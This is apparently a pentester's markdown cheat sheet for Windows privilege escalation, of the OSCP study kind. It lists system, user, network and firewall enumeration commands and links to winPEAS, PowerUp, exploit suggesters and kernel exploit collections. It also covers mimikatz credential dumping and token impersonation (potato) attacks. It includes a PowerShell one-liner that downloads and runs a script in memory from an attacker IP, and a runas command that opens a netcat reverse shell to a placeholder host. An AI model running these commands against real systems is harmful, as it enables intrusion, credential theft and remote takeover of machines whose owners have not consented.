**Resources:**

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

- [Sushant747 Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)

- [Absolomb Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**Manual Enumeration:**

 System:
 
    systeminfo   
    wmic qfe get Caption,Description,HotFixID,InstalledOn  #Patch info   
    wmic logicaldisk get caption,description,providername  #Disk info
    
    dir <file> /s /p   #Find file name. /s search all folders on HD, /p pause on each screen
    
  User:
  
    whoami /priv #privileges for current user    
    whoami /groups    
    net user 
    net user <user> 

  Network: 
  
    ipconfig
    arp -a
    route print
    netstat -ano
    
   If you find network services that are only available to the local host or a dualhomed NIC you may want to [port forward](https://github.com/Kahvi-0/Cheat-Sheets/blob/master/Post%20exploitation/Windows/Port%20forwarding.md) them to your host 
    
  Password hunting:

     findstr /si password *.txt *.ini *.config
     
  AV: 
  
      sc query windefend
      sc queryex type= service
      
  Firewall:
  
      netsh advfirewall firewall dump
      netsh firewall show state
      netsh firewall show config

**Automated Enumeration**

-------------------------------------------------------------------------------------

- [winPEAS .bat](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat)

      wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
      
 - [winPEAS .exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
      
-------------------------------------------------------------------------------------
    
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

Run powershell and run the following to download and run in memory

    iex(New-Object Net.WebClient).DownloadString('http://<ip>:<port>PowerUp.ps1')
    
-------------------------------------------------------------------------------------


- [Windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

      wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py && chmod +x windows-exploit-suggester.py && ./windows-exploit-suggester.py --update
      
      # This download and will create an .xlsx database
      
       CMD "systeminfo" saved to a file 
      
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt 
      
      # Without 
      
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'

-------------------------------------------------------------------------------------


- Meterpreter exploit suggester module

      post/multi/recon/local_exploit_suggester


-------------------------------------------------------------------------------------

[Meterpreter getsystem](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/)

 Note: technique 2 writes to disk ! Which means that it can get caught by AV.

-------------------------------------------------------------------------------------

**[Kernel](https://github.com/Kahvi-0/General-Notes/blob/master/Processes%20and%20architecture/Kernel.md) Exploits**

  Knowing the build of the OS is importent to knowing what kernel version is running and what vulnerabilties that kernel version might have. If you can own the kernel, you own the system.
  
 - Research Kernel exploits shown from tool output such as the exploit suggesters.
  
 - [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

-------------------------------------------------------------------------------------


**Password Hunting**

- Cleartext:

   Note that a lot of these will also be included in the automated enumeration tools

  - [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)
 
- Hashed: 

  - [Pentest lab](https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/)

  - [mimikatz](https://github.com/Kahvi-0/Tools-and-Concepts/blob/master/Windows/Mimikatz.md)

     - Need process with permissions to be able to interact with the running lsass.exe process
        -  ran as NT AUTHORITY\SYSTEM
        -  Must be same arch as the lsass.exe running on the target
        
-------------------------------------------------------------------------------------

    
**[Token impersonation](https://github.com/Kahvi-0/Vulnerabilities-and-Exploitations/blob/master/Windows/Token%20impersonation%20%7C%20potato%20attacks.md)**

    whoami /priv  #windows shell
    getprivs      #meterpreter
    
  [Juicy privileges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges) to look for.
  
  [Juicy potato](https://github.com/ohpe/juicy-potato)
  
   Meterpreter version of potato attack. Requires a meterpreter session with the same architecture as the target.

    exploit/windows/local/ms16_075_reflection_juicy   #Windows 10
    exploit/windows/local/ms16_075_reflection

-------------------------------------------------------------------------------------
   
**[RUNAS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas)**
 Get a copy of nc.exe onto the target

    runas /savecred /user:<machine>\<user> "nc.exe -nv <IP> <port> -e cmd.exe"
   
-------------------------------------------------------------------------------------
 
  - [Nishang repo](https://github.com/samratashok/nishang)
